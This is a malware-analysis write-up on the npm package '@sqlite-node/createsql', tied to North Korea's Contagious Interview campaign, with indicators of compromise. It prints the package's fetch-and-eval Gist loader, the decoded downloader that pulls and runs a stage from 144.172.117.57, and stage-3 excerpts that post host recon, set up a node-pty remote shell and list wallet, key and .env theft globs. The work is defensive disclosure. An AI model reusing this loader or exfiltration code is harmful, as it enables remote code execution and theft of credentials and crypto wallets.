---
title: "@sqlite-node/createsql: the DPRK's npm quota, fulfilled via GitHub Gist"
date: 2026-06-13
summary: "The 707-byte package ships nothing but a fetch-and-eval; four hops later the same BeaverTail-to-InvisibleFerret kit from three prior finds is back on a brand-new IP, running a node-pty shell and hunting wallet seed phrases."
packageName: "@sqlite-node/createsql"
ecosystem: npm
---

<img src="/assets/images/sqlite-node-createsql-dprk-agitprop.jpg" alt="A North Korean propaganda poster — a worker barks into a radio under a banner reading 'Let's unconditionally fulfill this year's people's economic plan!' — standing in for the Contagious Interview crew making its quota again: a fourth npm sample of the same BeaverTail-to-InvisibleFerret kit, this time delivered from a GitHub Gist." style="width: 60%; height: auto;">

The package is 707 bytes, and almost none of them are malicious. Its entire `index.js` fetches one GitHub Gist through the API and evals the response — npm does the fetching, npm does the detonating, and the actual weapon never ships in the tarball. What unrolls from there is the same DPRK Contagious Interview kit this site has now caught four times; the only thing that changed is the wrapper.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `@sqlite-node/createsql` |
| Version | `1.0.7` |
| Description | `A SQLite Tooslkit for node version ` |
| Author | `anton carlos` |
| License | `ISC` |
| Repository | `git+https://github.com/guilderguzman/array-utl_nodelump.git` |
| Keywords | `node`, `lamp` |
| Main | `index.js` |

## Stage 1 — the Gist dead-drop

The loader pulls the Gist's first file from the GitHub API and evals its text, so GitHub is the dead-drop and the operator can swap the payload without ever republishing to npm.

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// index.js — the entire package</span>
<span class="tok-kw">const</span> gisturl = <span class="tok-str">"https://gist.github.com/metabrainai000/198a0bbec7a6018e9250615d26e37b90.js"</span>;
<span class="tok-kw">const</span> gistId = gisturl.<span class="tok-fn">split</span>(<span class="tok-str">'/'</span>).<span class="tok-fn">pop</span>().<span class="tok-fn">replace</span>(<span class="tok-str">'.js'</span>, <span class="tok-str">''</span>);
<span class="tok-kw">const</span> apiTarget = <span class="tok-tmpl">`https://api.github.com/gists/<span class="tok-tmpl-expr">${gistId}</span>`</span>;
<span class="tok-kw">const</span> response = <span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(apiTarget);
<span class="tok-kw">const</span> scriptText = (<span class="tok-kw">await</span> response.<span class="tok-fn">json</span>()).files[<span class="tok-comment">/* first */</span>].content;
<span class="tok-fn">eval</span>(scriptText);
</code></pre>
{% endraw %}

| | Trait | Evidence |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/channel/deaddrop/github` | GitHub Gist API content executed with `eval` [T1102.003, T1059.007] |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/hidden-payload/staging` | npm package loads and evals GitHub Gist API content [T1195.002] |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval` | Fetch remote code and eval in memory [T1059.007] |

## Stage 2 — what the Gist serves

The Gist body is a javascript-obfuscator blob; decoded, it does four things in order. It installs its own HTTP and socket libraries with npm, pulls the next stage from a hard-coded IP, writes it to disk, and runs it with `node` — the malware uses npm as its own package manager.

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// next-stage-script.js (the Gist) — javascript-obfuscator blob, decoded</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">'npm install axios socket.io-client --no-save --loglevel silent'</span>, { cwd: <span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span> });
<span class="tok-kw">const</span> { data } = <span class="tok-kw">await</span> axios.<span class="tok-fn">get</span>(<span class="tok-str">'http://144.172.117.57/api/service/9aba3ce72b399b18cb920d6ade09d534'</span>);
<span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'0001.dat'</span>), data, { flag: <span class="tok-str">'w+'</span> });
<span class="tok-fn">execSync</span>(<span class="tok-str">'node 0001.dat'</span>, { cwd: <span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span> });
</code></pre>
{% endraw %}

| | Trait | Evidence |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/network-stage` | Obfuscated Node hidden-stage downloader [T1105, T1059.007, T1027] |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/hidden-payload/runtime` | Obfuscated Node loader hides staged execution [T1195.002, T1105] |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/obfuscation/tools/js-obfuscator` | Advanced array-shuffling decoder loop [T1027.002] |
| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/process/create/spawn` | `windowsHide` set via expression on the spawn |

## Stage 3 — the fan-out

`0001.dat` is where the 707 bytes finally pay off: it writes and spawns four payloads, none of which ever touched the registry. Together they are a complete InvisibleFerret kit — a node-pty remote shell, a multipart file-stealer, and a clipboard watcher — every packet stamped with the same campaign id the download URL carried. Its glob list reads like a crypto-wallet shopping run — seed-phrase and private-key filename patterns, dotenv files, browser and wallet directories — and the loot is POSTed as multipart form-data to port 7626.

| Drop | Role | Sink |
| --- | --- | --- |
| `scdata` | Recon + control client; POSTs OS/user/home/shell, installs `ssh2` + `node-pty@1.0.0` for an interactive remote shell | `/api/service/process/<uid>`, `/api/service/makelog` |
| `ldata` | `form-data` multipart-uploader bundle | `144.172.117.57:7626/upload` |
| `node -e` #1 | Recursive file stealer — wallet/seed/private-key/dotenv globs, browser & wallet dirs | `144.172.117.57:7626/upload` |
| `node -e` #2 | Clipboard watcher — `pbpaste` (macOS) / `Get-Clipboard` (Windows) | `/api/service/makelog` |

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// scdata — host recon to the campaign-id endpoint, then a remote-shell toolchain</span>
axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://144.172.117.57/api/service/process/9aba3ce72b399b18cb920d6ade09d534'</span>, {
  OS: <span class="tok-str">'Linux'</span>, platform, release, host,
  userInfo: { uid, gid, username, homedir, shell }, uid, t: <span class="tok-str">'1'</span> });
<span class="tok-fn">execSync</span>(<span class="tok-str">'npm install socket.io-client ssh2 node-pty@1.0.0 ...'</span>);

<span class="tok-com">// node -e #1 — file-stealer globs, cleartext in the obfuscated string array</span>
[<span class="tok-str">'*secret phrase*'</span>, <span class="tok-str">'*private key*'</span>, <span class="tok-str">'*.env*'</span>, <span class="tok-str">'*.pdf'</span>, <span class="tok-str">'.ssh'</span>, …]  <span class="tok-com">// → :7626/upload</span>
</code></pre>
{% endraw %}

The on-disk stage-3 file is one obfuscated line, so the four drops above were recovered by running the chain under instrumentation — every fetch, write, and spawn stubbed and logged — not by reading them.

| | Trait | Evidence |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/data-file` | Single-line obfuscated payload contains Node stage runtime [T1027, T1059.007] |

## Same kit, new address

Strip the wrapper and this is [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/), [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/), and [path-internal-util](/discoveries/2026/06/path-internal-util-trojanized-path-remote-eval/) one more time — the same scdata control client, the same makelog exfil path, the same node-pty shell, the same seed-phrase globs, all already pinned to North Korea's Contagious Interview campaign via [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). What's new is the address: the C2 is `144.172.117.57` with an upload port of 7626, off the Tier.Net 216.126.224.0/22 range every prior sample leaned on, and stage 2 now hides in a public GitHub Gist instead of a jsonkeeper blob. Same operators, same quota — they've just moved the dead-drop onto GitHub and rented a fresh IP to collect.

## Indicators

| Indicator | Value |
| --- | --- |
| Tarball SHA-256 | [1fdd44688b0c659850b1afb6163655e5f7e8ba087fb7638d6a8d4d924e8dd2e0](https://lab.atomdrift.org/file/1fdd44688b0c659850b1afb6163655e5f7e8ba087fb7638d6a8d4d924e8dd2e0) |
| `index.js` SHA-256 | [1f7b28a203a45563eb516228ba2beda4810887717cc64c49ab8dd5fdcf9458e5](https://lab.atomdrift.org/file/1f7b28a203a45563eb516228ba2beda4810887717cc64c49ab8dd5fdcf9458e5) |
| Stage-2 Gist body SHA-256 | [6c9787cc8feefde605f56b1acda9476639cdcd4fdf25cef3c380021ad65cfd99](https://lab.atomdrift.org/file/6c9787cc8feefde605f56b1acda9476639cdcd4fdf25cef3c380021ad65cfd99) |
| Stage-3 `0001.dat` SHA-256 | [448c74b0598bb0c37d90f93888220a121cf575252617e27ef6be6b71c210078e](https://lab.atomdrift.org/file/448c74b0598bb0c37d90f93888220a121cf575252617e27ef6be6b71c210078e) |
| Gist URL | `https://gist.github.com/metabrainai000/198a0bbec7a6018e9250615d26e37b90` |
| Gist API | `https://api.github.com/gists/198a0bbec7a6018e9250615d26e37b90` |
| Gist owner | `metabrainai000` |
| Stage-2 download | `http://144.172.117.57/api/service/9aba3ce72b399b18cb920d6ade09d534` |
| Recon endpoint | `http://144.172.117.57/api/service/process/9aba3ce72b399b18cb920d6ade09d534` |
| Log endpoint | `http://144.172.117.57/api/service/makelog` |
| File / clipboard exfil | `http://144.172.117.57:7626/upload` |
| Campaign id | `9aba3ce72b399b18cb920d6ade09d534` |
| Dropped artifacts | `0001.dat`, `scdata`, `ldata`, `vhost_ctl`, `npm-compiler.log` |
